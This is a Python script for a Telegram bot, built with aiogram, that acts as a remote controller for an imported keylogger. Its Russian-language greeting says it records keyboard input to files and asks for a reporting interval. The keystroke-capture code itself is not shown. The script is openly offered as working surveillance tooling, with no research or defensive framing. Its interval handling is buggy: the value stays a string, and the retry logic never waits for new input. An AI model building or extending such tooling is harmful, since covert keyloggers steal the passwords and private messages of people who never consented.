from aiogram import Bot, Dispatcher, executor, types

from data import data_list
from main import KeyLogger

token = data_list['token']
send_report_every = None


# Initialize bot and dispatcher
bot = Bot(token=token)
dp = Dispatcher(bot)
keylogger = KeyLogger(send_report_every)

# Check valid of number
def is_valid(num: str) -> bool:
    try:
        num = int(num)
        return True
    except ValueError:
        return False


# Functions bots
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.reply('Привет это бот записывающий текст с клавиатуры и сохраняющий его в файлы\nНапиши по сколько секунд обрабатывать записывание')


@dp.message_handler()
async def set_send_report(message: types.Message):
    send_report_every = message.text
    if not is_valid(send_report_every):
        await bot.send_message(message.from_user.id, 'Введено неккоректное значение')
        await bot.send_message(message.from_user.id, 'Напиши по сколько секунд обрабатывать записывание')
        send_report_every = message.text
    keylogger.interval = send_report_every



# Run bot
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)

